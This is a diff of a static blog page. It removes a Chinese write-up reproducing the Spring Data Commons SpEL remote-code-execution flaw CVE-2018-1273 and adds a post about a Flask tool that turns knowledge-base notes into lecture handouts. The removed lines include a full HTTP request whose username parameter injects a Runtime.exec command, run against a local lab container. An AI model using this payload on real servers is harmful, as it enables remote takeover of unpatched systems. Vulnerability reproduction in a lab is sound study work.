@@ -10,19 +10,19 @@
         let theme = localStorage.getItem("meek_theme") || "light";
         document.documentElement.setAttribute("data-color-mode", theme);
     </script>
-<meta name="description" content="危害：
+<meta name="description" content="## ⚙️ 说明
 
-- Spring Data Commons组件中存在远程代码执行漏洞，攻击者可构造包含有恶意代码的SPEL表达式实现远程代码攻击，直接获取服务器控制权限
-- Spring Data是一个用于简化数据库访问，并支持云服务的开源框架,包含Commons、Gemfire、JPA、JDBC、MongoDB等模块。">
-<meta property="og:title" content="Spring组件漏洞：CVE-2018-1273">
-<meta property="og:description" content="危害：
+&emsp;&emsp;最近用AI大模型尝试开发了一个讲义生成系统，这个系统尝试解决如下这个情况：
+- 本地有一个知识库，如果现在去做一个培训，恰好培训的内容是你在知识库当中平时记录的内容，现在需要将知识库中记录的笔记转化成讲义。">
+<meta property="og:title" content="讲义生成系统小记">
+<meta property="og:description" content="## ⚙️ 说明
 
-- Spring Data Commons组件中存在远程代码执行漏洞，攻击者可构造包含有恶意代码的SPEL表达式实现远程代码攻击，直接获取服务器控制权限
-- Spring Data是一个用于简化数据库访问，并支持云服务的开源框架,包含Commons、Gemfire、JPA、JDBC、MongoDB等模块。">
+&emsp;&emsp;最近用AI大模型尝试开发了一个讲义生成系统，这个系统尝试解决如下这个情况：
+- 本地有一个知识库，如果现在去做一个培训，恰好培训的内容是你在知识库当中平时记录的内容，现在需要将知识库中记录的笔记转化成讲义。">
 <meta property="og:type" content="article">
-<meta property="og:url" content="https://ClaudeRead.github.io/post/Spring-zu-jian-lou-dong-%EF%BC%9ACVE-2018-1273.html">
+<meta property="og:url" content="https://ClaudeRead.github.io/post/jiang-yi-sheng-cheng-xi-tong-xiao-ji.html">
 <meta property="og:image" content="https://avatars.githubusercontent.com/u/252286375?v=4&size=64">
-<title>Spring组件漏洞：CVE-2018-1273</title>
+<title>讲义生成系统小记</title>
 <link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
@@ -65,7 +65,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 
 <body>
     <div id="header">
-<h1 class="postTitle">Spring组件漏洞：CVE-2018-1273</h1>
+<h1 class="postTitle">讲义生成系统小记</h1>
 <div class="title-right">
     <a href="https://ClaudeRead.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
         <svg class="octicon" width="16" height="16">
@@ -73,7 +73,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
         </svg>
     </a>
     
-    <a href="https://github.com/ClaudeRead/ClaudeRead.github.io/issues/33" target="_blank" class="btn btn-invisible circle" title="Issue">
+    <a href="https://github.com/ClaudeRead/ClaudeRead.github.io/issues/53" target="_blank" class="btn btn-invisible circle" title="Issue">
         <svg class="octicon" width="16" height="16">
             <path id="pathIssue" fill-rule="evenodd"></path>
         </svg>
@@ -89,48 +89,80 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><p>危害：</p>
+<div class="markdown-body" id="postBody"><h2>⚙️ 说明</h2>
+<p>  最近用AI大模型尝试开发了一个讲义生成系统，这个系统尝试解决如下这个情况：</p>
 <ul>
-<li>Spring Data Commons组件中存在远程代码执行漏洞，攻击者可构造包含有恶意代码的SPEL表达式实现远程代码攻击，直接获取服务器控制权限</li>
-<li>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架,包含Commons、Gemfire、JPA、JDBC、MongoDB等模块。此漏洞产生于Spring Data Commons组件，该组件为提供共享的基础框架，适合各个子项目使用，支持跨数据库持久化。</li>
+<li>本地有一个知识库，如果现在去做一个培训，恰好培训的内容是你在知识库当中平时记录的内容，现在需要将知识库中记录的笔记转化成讲义。一般情况下，需要把每个笔记翻开一个个看，然后根据面向不同的人群，在把内容一个个复制到Word。这样效率十分低下，那么现在有了这个系统，只需维护知识库，就可以在Web界面上根据大纲选取内容，你可以控制是否显示在最后的生成的讲义当中带有“【】”中的内容(有可能是你的小记、或者注意之类的提示内容)，最后生成属于自己的讲义。</li>
 </ul>
-<p>受影响版本：</p>
+<h2>⚙️ 技术栈</h2>
 <ul>
-<li>Spring Data Commons 1.13 – 1.13.10 (Ingalls SR10)</li>
-<li>Spring Data REST 2.6 – 2.6.10(Ingalls SR10)</li>
-<li>Spring Data Commons 2.0 – 2.0.5 (Kay SR5)</li>
-<li>Spring Data REST 3.0 – 3.0.5(Kay SR5)</li>
-</ul>
-<p>复现：</p>
+<li><strong>后端</strong>：Python 3.6+，Flask框架</li>
+<li><strong>前端</strong>：HTML5，CSS3，JavaScript</li>
+<li><strong>依赖</strong>：
 <ul>
-<li>环境：docker Ubuntn</li>
-<li>工具：Burp</li>
-<li>步骤：<br>
- 1. 打开虚拟机进入Ubuntn<br>
- 2. 命令行输入：docker-compose up -d<br>
- 3. 启动后浏览器中输入<a href="http://%E6%9C%AC%E5%9C%B0IP:8080/users" rel="nofollow">http://本地IP:8080/users</a><br>
- 4. 此时网页当中会出现一个用户注册界面<br>
- 5. 使用Burp进行抓包<br>
- 6. 对数据包进行如下修改，修改后在进行发包<br>
- 7. 执行docker-compose exec spring bash进入容器中，可见成功创建/tmp/success，说明命令执行成功</li>
+<li>Flask：Web框架</li>
+<li>Flask-CORS：跨域支持</li>
+<li>markdown：Markdown解析</li>
 </ul>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/412d91d5-9e64-48dc-ac64-695bcd63301a"><img width="630" height="130" alt="Image" src="https://github.com/user-attachments/assets/412d91d5-9e64-48dc-ac64-695bcd63301a" style="max-width: 100%; height: auto; max-height: 130px;; aspect-ratio: 630 / 130; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p>
-<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-c1">POST</span> /users?page=&amp;size=<span class="pl-c1">5</span> <span class="pl-c1">HTTP</span>/<span class="pl-c1">1.1</span>
-Host: localhost:<span class="pl-c1">8080</span>
-Connection: keep-alive
-Content-Length: <span class="pl-c1">128</span>
-Pragma: no-cache
-Cache-Control: no-cache
-Origin: http:<span class="pl-c">//localhost:8080</span>
-Upgrade-Insecure-Requests: <span class="pl-c1">1</span>
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/<span class="pl-c1">5.0</span> (Windows <span class="pl-c1">NT</span> <span class="pl-c1">10.0</span>; Win64; x64) AppleWebKit/<span class="pl-c1">537.36</span> (<span class="pl-c1">KHTML</span>, like Gecko) Chrome/<span class="pl-c1">64.0</span>.<span class="pl-c1">3282.186</span> Safari/<span class="pl-c1">537.36</span>
-Accept: text/html,application/xhtml+xml,application/xml;q=<span class="pl-c1">0.9</span>,image/webp,image/apng,*/*;q=<span class="pl-c1">0.8</span>
-Referer: http:<span class="pl-c">//localhost:8080/users?page=0&amp;size=5</span>
-Accept-Encoding: gzip, deflate, br
-Accept-Language: zh-<span class="pl-c1">CN</span>,zh;q=<span class="pl-c1">0.9</span>,en;q=<span class="pl-c1">0.8</span>
-
-username[<span class="pl-c">#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&amp;password=&amp;repeatedPassword=</span></pre></div></div>
+</li>
+</ul>
+<h2>🗂️ 项目结构</h2>
+<pre class="notranslate"><code class="notranslate">main.py                   # 主入口文件
+run.py                    # 启动脚本
+run_linux.sh              # Linux启动脚本
+lecture_generator/
+├── app.py                 # 主应用程序（Flask）
+├── config.json            # 配置文件
+├── requirements.txt       # Python依赖
+├── core/                  # 核心模块
+│   ├── md_parser.py        # Markdown解析
+│   └── path_handler.py     # 配置与路径处理
+├── templates/             # HTML模板
+│   └── index.html         # 主界面
+├── static/                # 静态资源
+│   ├── css/
+│   │   ├── style.css      # 样式表
+│   │   └── all.min.css    # Font Awesome 图标
+│   └── js/
+│       ├── main.js        # 前端逻辑
+│       ├── marked.min.js  # Markdown解析
+│       └── purify.min.js  # HTML净化
+└── output/                # 生成的讲义
+</code></pre>
+<h2>🚀 快速开始</h2>
+<h3>方法二：手动安装</h3>
+<ol>
+<li>
+<p><strong>拉取项目</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">git clone https://github.com/ClaudeRead/ObsidianProject.git</pre></div>
+</li>
+<li>
+<p><strong>进入目录</strong></p>
+</li>
+</ol>
+<div class="highlight highlight-source-shell"><pre class="notranslate"> <span class="pl-c1">cd</span> ObsidianProject</pre></div>
+<ol start="3">
+<li>
+<p><strong>安装依赖</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">pip install -r lecture_generator/requirements.txt</pre></div>
+</li>
+<li>
+<p><strong>启动应用</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">python run.py</pre></div>
+</li>
+<li>
+<p><strong>访问界面</strong><br>
+打开浏览器访问：<a href="http://localhost:5000" rel="nofollow">http://localhost:5000</a></p>
+</li>
+</ol>
+<h2>📋 使用流程</h2>
+<ol>
+<li><strong>设置路径</strong>：选择知识库所存放的路径</li>
+<li><strong>选择文件</strong>：在左侧文件树中勾选需要的文件</li>
+<li><strong>配置选项</strong>：设置是否显示标签内容，选择输出格式</li>
+<li><strong>预览内容</strong>：点击"预览讲义"查看效果</li>
+<li><strong>生成下载</strong>：点击"生成讲义"并下载文件</li>
+</ol></div>
 <div style="font-size:small;margin-top:8px;float:right;">❤️转载文章请写原文链接❤️</div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
